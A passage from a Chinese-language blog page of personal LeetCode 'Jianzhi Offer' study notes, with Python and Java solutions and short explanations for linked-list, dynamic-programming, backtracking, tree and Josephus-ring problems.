res</span><br></pre></td></tr></table></div></figure>


        <h2 id="链表中倒数第k个节点"   >
          <a href="#链表中倒数第k个节点" class="heading-link"><i class="fas fa-link"></i></a><a href="#链表中倒数第k个节点" class="headerlink" title="链表中倒数第k个节点"></a>链表中倒数第k个节点</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015104808017.png" alt="image-20221015104808017"></p>
<p>快慢指针</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getKthFromEnd</span>(<span class="params">self, head: ListNode, k: <span class="built_in">int</span></span>) -&gt; ListNode:</span></span><br><span class="line">        originHead = head</span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(n != k):</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            head = head.<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">while</span>(head != <span class="literal">None</span>):</span><br><span class="line">            originHead = originHead.<span class="built_in">next</span></span><br><span class="line">            head = head.<span class="built_in">next</span></span><br><span class="line">        <span class="keyword">return</span> originHead</span><br></pre></td></tr></table></div></figure>


        <h2 id="把数字翻译成字符串"   >
          <a href="#把数字翻译成字符串" class="heading-link"><i class="fas fa-link"></i></a><a href="#把数字翻译成字符串" class="headerlink" title="把数字翻译成字符串"></a>把数字翻译成字符串</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015161943235.png" alt="image-20221015161943235"></p>
<p>动态规划，详见<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/ba-shu-zi-fan-yi-cheng-zi-fu-chuan-lcof/solution/mian-shi-ti-46-ba-shu-zi-fan-yi-cheng-zi-fu-chua-6/" >面试题46. 把数字翻译成字符串（动态规划，清晰图解） - 把数字翻译成字符串 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">translateNum</span>(<span class="params">self, num: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        numStr = <span class="built_in">str</span>(num)</span><br><span class="line"></span><br><span class="line">        dp = [<span class="number">0</span>] * (<span class="built_in">len</span>(numStr) + <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(numStr)):</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>):</span><br><span class="line">                dp[i] = <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="number">10</span> &lt;= <span class="built_in">int</span>(numStr[i - <span class="number">1</span>]) * <span class="number">10</span> + <span class="built_in">int</span>(numStr[i]) &lt;= <span class="number">25</span>):</span><br><span class="line">                <span class="keyword">if</span> (i - <span class="number">2</span> == -<span class="number">1</span>):</span><br><span class="line">                    dp[i] = <span class="number">2</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                dp[i] = dp[i - <span class="number">2</span>] + dp[i - <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dp[i] = dp[i - <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="built_in">len</span>(numStr) - <span class="number">1</span>]</span><br></pre></td></tr></table></div></figure>

<p>需要注意的是组合的数字范围为10<del>25，而不是0</del>25，因为01、02……不能进行组合翻译，我说怎么一直错</p>

        <h2 id="字符串的排列"   >
          <a href="#字符串的排列" class="heading-link"><i class="fas fa-link"></i></a><a href="#字符串的排列" class="headerlink" title="字符串的排列"></a>字符串的排列</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015113114460.png" alt="image-20221015113114460"></p>
<p>回溯加去重</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">permutation</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">back</span>(<span class="params">s, tmp</span>):</span></span><br><span class="line">            <span class="comment">#到末尾时添加</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">not</span> s):</span><br><span class="line">                res.append(<span class="string">&quot;&quot;</span>.join(tmp))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">                <span class="comment">#去掉当前的字符的数组，传入下一层的回溯函数</span></span><br><span class="line">                tmpNums = s[:i] + s[i + <span class="number">1</span>:]</span><br><span class="line">                <span class="comment">#表示当前层的字符</span></span><br><span class="line">                tmpTmp = tmp + [s[i]]</span><br><span class="line">                <span class="comment">#调用回溯</span></span><br><span class="line">                back(tmpNums, tmpTmp)</span><br><span class="line">        back(s, [])</span><br><span class="line">        hashSet = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">            hashSet.add(i)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">list</span>(hashSet)</span><br></pre></td></tr></table></div></figure>






        <h2 id="从尾到头打印链表"   >
          <a href="#从尾到头打印链表" class="heading-link"><i class="fas fa-link"></i></a><a href="#从尾到头打印链表" class="headerlink" title="从尾到头打印链表"></a>从尾到头打印链表</h2>
      <p>栈</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221015162618579.png" alt="image-20221015162618579"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reversePrint</span>(<span class="params">self, head: ListNode</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        stack = []</span><br><span class="line">        <span class="keyword">while</span>(head != <span class="literal">None</span>):</span><br><span class="line">            stack.append(head.val)</span><br><span class="line">            head = head.<span class="built_in">next</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">len</span>(stack) != <span class="number">0</span>):</span><br><span class="line">            res.append(stack.pop())</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></div></figure>




        <h2 id="斐波那契数列"   >
          <a href="#斐波那契数列" class="heading-link"><i class="fas fa-link"></i></a><a href="#斐波那契数列" class="headerlink" title="斐波那契数列"></a>斐波那契数列</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221016150131190.png" alt="image-20221016150131190">递归会超时，所以转化为循环</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    F = []</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        self.F = [<span class="number">0</span>] * (n+<span class="number">1</span>)</span><br><span class="line">        self.F[<span class="number">0</span>] = <span class="number">0</span></span><br><span class="line">        self.F[<span class="number">1</span>] = <span class="number">1</span></span><br><span class="line">        i = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span>( i &lt;= n):</span><br><span class="line">            self.F[i] = (self.F[i-<span class="number">2</span>] + self.F[i-<span class="number">1</span>])% <span class="number">1000000007</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> self.F[n]</span><br></pre></td></tr></table></div></figure>

<p>但是还有时间复杂度更低的矩阵快速幂</p>
<p>参考官方解，时间复杂度为<code>O(logn)</code></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/fei-bo-na-qi-shu-lie-lcof/solution/fei-bo-na-qi-shu-lie-by-leetcode-solutio-hbss/" >斐波那契数列 - 斐波那契数列 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221016154942500.png" alt="image-20221016154942500"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">quickMi</span>(<span class="params">num,power</span>):</span></span><br><span class="line">            ans = <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> (power &gt; <span class="number">0</span>):</span><br><span class="line">                <span class="keyword">if</span>(power &amp; <span class="number">1</span> &gt; <span class="number">0</span>): <span class="comment">#奇数则再乘以底数</span></span><br><span class="line">                    ans = np.dot(ans, num) % <span class="number">1000000007</span></span><br><span class="line">                num = np.dot(num,num)</span><br><span class="line">                power = power &gt;&gt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ans</span><br><span class="line">        matrix = np.array([[<span class="number">1</span>, <span class="number">1</span>], [<span class="number">1</span>,<span class="number">0</span>]])</span><br><span class="line">        res = quickMi(matrix,n-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> res[<span class="number">0</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></div></figure>




        <h2 id="扑克牌中的顺子"   >
          <a href="#扑克牌中的顺子" class="heading-link"><i class="fas fa-link"></i></a><a href="#扑克牌中的顺子" class="headerlink" title="扑克牌中的顺子"></a>扑克牌中的顺子</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221016162013412.png" alt="image-20221016162013412"></p>
<p>顺子长度不一定为5时</p>
<p>先确定0的个数<code>count</code>，排除0，然后hash去重，得到<code>hashSet</code></p>
<p>先判断去重后<code>hashSet</code>加<code>count</code>的长度是否还是为原数组长度，如果改变则代表有相同的非0元素，则不可能为顺子，直接<code>False</code></p>
<p>判断此时<code>listNums</code>中最大和最小的差值是否小于等于0的个数<code>count</code>加<code>len(listNums)</code>，小于等于则为<code>True</code>，否则为<code>False</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parition</span>(<span class="params">self,nums,low,high</span>):</span></span><br><span class="line">        pivot_idx = random.randint(low,high)</span><br><span class="line">        pivot = nums[pivot_idx]</span><br><span class="line">        left,right = low,high</span><br><span class="line">        nums[left],nums[pivot_idx] = nums[pivot_idx],nums[left]</span><br><span class="line">        <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right <span class="keyword">and</span> nums[right] &gt; pivot):</span><br><span class="line">                right -= <span class="number">1</span></span><br><span class="line">            nums[left] = nums[right]</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right <span class="keyword">and</span> nums[left] &lt;= pivot):</span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">            nums[right] = nums[left]</span><br><span class="line">        nums[left] = pivot</span><br><span class="line">        <span class="keyword">return</span> left</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quickSort</span>(<span class="params">self,nums,low,high</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(low &gt; high):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        mid = self.parition(nums,low,high)</span><br><span class="line">        self.quickSort(nums,low,mid-<span class="number">1</span>)</span><br><span class="line">        self.quickSort(nums,mid+<span class="number">1</span>,high)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortArray</span>(<span class="params">self,nums</span>):</span></span><br><span class="line">        self.quickSort(nums,<span class="number">0</span>,<span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isStraight</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">        hashSet = <span class="built_in">set</span>()</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            hashSet.add(i)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(hashSet) + count != <span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        listNums = <span class="built_in">list</span>(hashSet)</span><br><span class="line">        listNums = self.sortArray(listNums)</span><br><span class="line">        <span class="keyword">if</span>(listNums[<span class="built_in">len</span>(listNums)-<span class="number">1</span>] - listNums[<span class="number">0</span>] &lt;= count + <span class="built_in">len</span>(listNums) - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>




        <h2 id="二叉搜索树与双向链表"   >
          <a href="#二叉搜索树与双向链表" class="heading-link"><i class="fas fa-link"></i></a><a href="#二叉搜索树与双向链表" class="headerlink" title="二叉搜索树与双向链表"></a>二叉搜索树与双向链表</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221017161643904.png" alt="image-20221017161643904"></p>
<p>结合中序遍历的特点，加入处理</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inorderTraversal</span><span class="params">(Node cur)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cur == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    inorderTraversal(cur.left);</span><br><span class="line">    <span class="comment">//.......处理指针</span></span><br><span class="line">    inorderTraversal(cur.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后每次处理的时候，利用前驱节点<code>pre</code>与当前节点<code>cur</code>进行处理</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(pre != <span class="keyword">null</span>)&#123;</span><br><span class="line">    pre.right = cur;</span><br><span class="line">    cur.left = pre;</span><br><span class="line">    pre = cur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>当前驱节点<code>pre</code>为<code>null</code>时说明在遍历头节点，那么得到头节点，如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    head = cur;</span><br><span class="line">    pre = cur;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>记得最后在头节点和尾部节点也要加入双向指针</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">head.left = pre;</span><br><span class="line">pre.right = head;</span><br></pre></td></tr></table></div></figure>

<p>最终如下</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    Node pre, head;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Node <span class="title">treeToDoublyList</span><span class="params">(Node root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        inorderTraversal(root);</span><br><span class="line">        head.left = pre;</span><br><span class="line">        pre.right = head;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inorderTraversal</span><span class="params">(Node cur)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        inorderTraversal(cur.left);</span><br><span class="line">        <span class="keyword">if</span>(pre != <span class="keyword">null</span>)&#123;</span><br><span class="line">            pre.right = cur;</span><br><span class="line">            cur.left = pre;</span><br><span class="line">            pre = cur;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            head = cur;</span><br><span class="line">            pre = cur;</span><br><span class="line">        &#125;</span><br><span class="line">        inorderTraversal(cur.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="树的子结构"   >
          <a href="#树的子结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#树的子结构" class="headerlink" title="树的子结构"></a>树的子结构</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221017231434539.png" alt="image-20221017231434539"></p>
<p>先找到结点数值相同的结点</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findNode</span>(<span class="params">self, rootA: TreeNode, rootB: TreeNode</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(rootA == <span class="literal">None</span> <span class="keyword">or</span> rootB == <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span>(rootA.val != rootB.val):<span class="comment">#先找到</span></span><br><span class="line">        <span class="keyword">return</span> self.findNode(rootA.left, rootB) <span class="keyword">or</span> self.findNode(rootA.right, rootB)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#.....找到了就判断</span></span><br></pre></td></tr></table></div></figure>

<p>判断</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span>(<span class="params">self,rootA: TreeNode,rootB: TreeNode</span>):</span></span><br><span class="line">    <span class="keyword">if</span>(rootB == <span class="literal">None</span>):<span class="comment">#遍历到最后了代表一致</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span>(rootA == <span class="literal">None</span>):<span class="comment">#A遍历完还没有代表没有</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span>(rootA.val == rootB.val <span class="keyword">and</span> self.judge(rootA.left,rootB.left) <span class="keyword">and</span> self.judge(rootA.right,rootB.right)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></div></figure>

<p>最终结果</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">judge</span>(<span class="params">self,rootA: TreeNode,rootB: TreeNode</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(rootB == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">if</span>(rootA == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span>(rootA.val == rootB.val <span class="keyword">and</span> self.judge(rootA.left,rootB.left) <span class="keyword">and</span> self.judge(rootA.right,rootB.right)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findNode</span>(<span class="params">self, rootA: TreeNode, rootB: TreeNode</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(rootA == <span class="literal">None</span> <span class="keyword">or</span> rootB == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span>(rootA.val != rootB.val):<span class="comment">#先找到</span></span><br><span class="line">            <span class="keyword">return</span> self.findNode(rootA.left, rootB) <span class="keyword">or</span> self.findNode(rootA.right, rootB)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span>  self.judge(rootA.left,rootB.left) <span class="keyword">and</span> self.judge(rootA.right,rootB.right)</span><br><span class="line"></span><br><span class="line">	<span class="comment">#注意开始的头节点</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">isSubStructure</span>(<span class="params">self, A: TreeNode, B: TreeNode</span>) -&gt; <span class="built_in">bool</span>:</span></span><br><span class="line">        <span class="keyword">if</span>(A == <span class="literal">None</span> <span class="keyword">or</span> B == <span class="literal">None</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span>(A.val == B.val):</span><br><span class="line">            <span class="keyword">if</span>(self.judge(A,B) == <span class="literal">False</span>):</span><br><span class="line">                A.val = B.val + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> self.findNode(A, B)</span><br></pre></td></tr></table></div></figure>


        <h2 id="圆圈中最后剩下的数字"   >
          <a href="#圆圈中最后剩下的数字" class="heading-link"><i class="fas fa-link"></i></a><a href="#圆圈中最后剩下的数字" class="headerlink" title="圆圈中最后剩下的数字"></a>圆圈中最后剩下的数字</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221018214142551.png" alt="image-20221018214142551"></p>
<p>约瑟夫环问题，详情参考如下</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/solution/huan-ge-jiao-du-ju-li-jie-jue-yue-se-fu-huan-by-as/" >换个角度举例解决约瑟夫环 - 圆圈中最后剩下的数字 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/solution/jian-zhi-offer-62-yuan-quan-zhong-zui-ho-dcow/" >剑指 Offer 62. 圆圈中最后剩下的数字（数学 / 动态规划，清晰图解） - 圆圈中最后剩下的数字 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>对于<code>f(n,m)</code>问题，固定m，对n做规律，得到状态转换方程</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dp[n] = (dp[n-1] + m) % n</span><br><span class="line">dp[1] = 0</span><br></pre></td></tr></table></div></figure>

<p>由此可得代码</p>
